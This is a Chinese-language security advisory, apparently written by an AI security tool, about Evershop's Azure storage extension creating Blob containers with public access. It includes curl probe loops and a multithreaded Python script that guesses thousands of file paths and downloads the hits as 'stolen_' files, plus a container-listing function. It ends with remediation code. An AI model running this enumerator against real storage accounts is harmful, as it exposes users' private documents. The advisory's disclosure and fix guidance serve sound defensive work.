# Evershop Azure Container 公开访问配置漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform - Azure File Storage Extension
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：安全配置错误 (CWE-16) / 访问控制缺失 (CWE-284)
- **漏洞名称**：Evershop Azure Blob Container 默认公开访问配置漏洞
- **风险等级**：中危
- **概述**：Azure File Storage扩展在创建Blob容器时默认配置为公开访问（`access: "blob"`），这意味着任何知道Blob URL的人都可以直接访问存储的文件，无需身份验证。这可能导致敏感文件被未授权访问。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：无
- **操作条件**：
  1. 系统使用Azure File Storage扩展
  2. 攻击者获取或猜测到Blob URL
- **攻击特征**：直接通过HTTP访问Azure Blob URL

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **未授权文件访问**：直接访问存储的任意文件
2. **数据泄露**：敏感文件（如上传的身份证明、合同等）被泄露
3. **URL猜测攻击**：通过枚举文件名访问其他用户的文件
4. **容器枚举**：可能列出容器中的所有文件

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位漏洞配置**

文件：`extensions/azure_file_storage/src/services/azureFileUploader.ts`
```typescript
// Create a container if it does not exist with access level set to public
await containerClient.createIfNotExists({
  access: "blob",  // <-- 公开访问！
});
```

文件：`extensions/azure_file_storage/src/services/azureFileBrowser.ts`
```typescript
// Create a container if it does not exist with access level set to public
await containerClient.createIfNotExists({
  access: "blob",  // <-- 同样配置为公开
});
```

**步骤2：理解公开访问级别**

Azure Blob容器访问级别：
- `undefined`（私有）：需要授权才能访问
- `"blob"`：匿名可读取Blob，但不能列出容器
- `"container"`：匿名可读取和列出所有Blob

当前配置为`"blob"`，意味着任何人知道URL即可访问。

**步骤3：验证公开访问**

```bash
# 假设获取到的Blob URL
BLOB_URL="https://evershopstorage.blob.core.windows.net/images/products/product1.jpg"

# 直接访问（无需认证）
curl -I "$BLOB_URL"

# 预期响应 - 200 OK（可访问）
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Length: 123456
...
```

**步骤4：批量访问测试**

```bash
# 尝试访问各种可能的文件
for file in product1 product2 product3 user_avatar config backup; do
  curl -s -o /dev/null -w "%{http_code} " \
    "https://evershopstorage.blob.core.windows.net/images/${file}.jpg"
done
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Azure Public Container Access PoC
"""

import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

class PublicBlobExplorer:
    def __init__(self, storage_account, container_name):
        self.base_url = f"https://{storage_account}.blob.core.windows.net/{container_name}"
        self.found_files = []

    def check_blob(self, blob_path):
        """
        检查Blob是否可公开访问
        """
        url = f"{self.base_url}/{blob_path}"
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                size = response.headers.get('Content-Length', 'unknown')
                content_type = response.headers.get('Content-Type', 'unknown')
                print(f"[+] 可访问: {blob_path} ({content_type}, {size} bytes)")
                self.found_files.append({
                    'path': blob_path,
                    'url': url,
                    'size': size,
                    'type': content_type
                })
                return True
            return False
        except:
            return False

    def enumerate_files(self, paths, max_workers=10):
        """
        并发枚举文件
        """
        print(f"[*] 开始枚举 {len(paths)} 个路径...")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(self.check_blob, paths)

        print(f"\n[*] 发现 {len(self.found_files)} 个可访问文件")
        return self.found_files

    def download_file(self, blob_path, save_path):
        """
        下载公开访问的文件
        """
        url = f"{self.base_url}/{blob_path}"
        response = requests.get(url)

        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(response.content)
            print(f"[+] 已下载: {save_path}")
            return True
        return False


def generate_common_paths():
    """
    生成常见的文件路径用于枚举
    """
    # 常见目录
    directories = ['products', 'users', 'uploads', 'images', 'avatars',
                   'documents', 'invoices', 'orders', 'temp', 'backups']

    # 常见文件名模式
    filenames = [f"image{i}" for i in range(1, 100)]
    filenames += [f"product{i}" for i in range(1, 100)]
    filenames += [f"user{i}" for i in range(1, 100)]
    filenames += ['logo', 'banner', 'default', 'placeholder', 'avatar']

    # 常见扩展名
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.doc', '.xlsx']

    # 组合路径
    paths = []
    for dir in directories:
        for name in filenames:
            for ext in extensions:
                paths.append(f"{dir}/{name}{ext}")

    # 添加根目录文件
    for name in filenames:
        for ext in extensions:
            paths.append(f"{name}{ext}")

    return paths


def main():
    # 从信息泄露中获取的存储账户信息
    storage_account = "evershopstorage"
    container_name = "images"

    explorer = PublicBlobExplorer(storage_account, container_name)

    print("=" * 60)
    print(" Azure Public Container Access PoC")
    print("=" * 60)
    print()
    print(f"[*] 存储账户: {storage_account}")
    print(f"[*] 容器名称: {container_name}")
    print()

    # 生成常见路径
    paths = generate_common_paths()

    # 枚举可访问文件
    found = explorer.enumerate_files(paths)

    # 尝试下载敏感文件
    if found:
        print("\n[*] 尝试下载发现的文件...")
        for file in found[:5]:  # 下载前5个
            save_name = file['path'].replace('/', '_')
            explorer.download_file(file['path'], f"stolen_{save_name}")


if __name__ == "__main__":
    main()
```

### 4.2 容器列表枚举

```python
def try_list_container(storage_account, container_name):
    """
    尝试列出容器内容（如果配置为container级别访问）
    """
    list_url = (f"https://{storage_account}.blob.core.windows.net/"
                f"{container_name}?restype=container&comp=list")

    response = requests.get(list_url)

    if response.status_code == 200:
        print("[!] 容器可公开列出!")
        # 解析XML获取所有Blob
        import re
        blobs = re.findall(r'<Name>([^<]+)</Name>', response.text)
        print(f"[+] 发现 {len(blobs)} 个Blob:")
        for blob in blobs[:20]:
            print(f"    - {blob}")
        return blobs
    else:
        print("[-] 容器列表访问被拒绝（仅blob级别公开）")
        return []
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Azure Container 公开访问配置                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  代码配置:                                                      │
│  ┌─────────────────────────────────────────┐                  │
│  │ await containerClient.createIfNotExists({│                  │
│  │   access: "blob"  ← 公开Blob访问        │                  │
│  │ });                                     │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ Azure Blob Storage 配置                 │                  │
│  │                                         │                  │
│  │ 容器访问级别: Blob (公开读取)            │                  │
│  │                                         │                  │
│  │ 效果:                                   │                  │
│  │ - 知道URL即可访问任何Blob               │                  │
│  │ - 无需SAS令牌                           │                  │
│  │ - 无需账户密钥                          │                  │
│  │ - 无需任何身份验证                      │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 攻击者利用                               │                  │
│  │                                         │                  │
│  │ 1. 从API响应获取Blob URL                │                  │
│  │ 2. 直接HTTP GET访问文件                 │                  │
│  │ 3. 枚举猜测其他文件名                    │                  │
│  │ 4. 批量下载敏感文件                      │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
│  风险场景:                                                      │
│  - 用户上传的私人文档被公开访问                                  │
│  - 产品图片被竞争对手批量下载                                    │
│  - 备份文件被未授权访问                                         │
│  - 内部配置文件泄露                                             │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **默认不安全配置**：代码硬编码`access: "blob"`
2. **无配置选项**：未提供通过环境变量控制访问级别的选项
3. **安全意识不足**：开发时为便捷选择公开访问
4. **缺乏文档警告**：未在文档中说明安全风险

## 6. 修复建议

### 6.1 方案A：默认私有访问

```typescript
// 默认私有，不传access参数
await containerClient.createIfNotExists();
// 或明确设置为undefined
await containerClient.createIfNotExists({
  access: undefined  // 私有访问
});
```

### 6.2 方案B：可配置访问级别

```typescript
const containerAccess = getEnv("AZURE_CONTAINER_ACCESS", "private");

let accessLevel: "blob" | "container" | undefined;
switch (containerAccess) {
  case "blob":
    accessLevel = "blob";
    console.warn("WARNING: Container configured for public blob access");
    break;
  case "container":
    accessLevel = "container";
    console.warn("WARNING: Container configured for full public access");
    break;
  default:
    accessLevel = undefined;  // 私有
}

await containerClient.createIfNotExists({
  access: accessLevel
});
```

### 6.3 方案C：使用签名URL

```typescript
import { generateBlobSASQueryParameters, BlobSASPermissions } from "@azure/storage-blob";

// 容器设为私有
await containerClient.createIfNotExists({
  access: undefined
});

// 访问时生成临时签名URL
function generateSecureUrl(blobPath: string, expiryMinutes: number = 30): string {
  const blobClient = containerClient.getBlobClient(blobPath);

  const sasToken = generateBlobSASQueryParameters(
    {
      containerName: containerName,
      blobName: blobPath,
      permissions: BlobSASPermissions.parse("r"),
      expiresOn: new Date(Date.now() + expiryMinutes * 60 * 1000),
    },
    sharedKeyCredential
  ).toString();

  return `${blobClient.url}?${sasToken}`;
}
```

### 6.4 安全配置检查

```typescript
// 启动时检查并警告
async function checkContainerSecurity() {
  const properties = await containerClient.getProperties();
  const accessType = properties.blobPublicAccess;

  if (accessType === "blob" || accessType === "container") {
    console.error(`
    ╔═══════════════════════════════════════════════════════════╗
    ║ SECURITY WARNING: Azure container is publicly accessible!  ║
    ║ Access Level: ${accessType.padEnd(46)}║
    ║                                                           ║
    ║ This may expose sensitive files to unauthorized access.   ║
    ║ Consider setting access to private and using SAS tokens.  ║
    ╚═══════════════════════════════════════════════════════════╝
    `);
  }
}
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
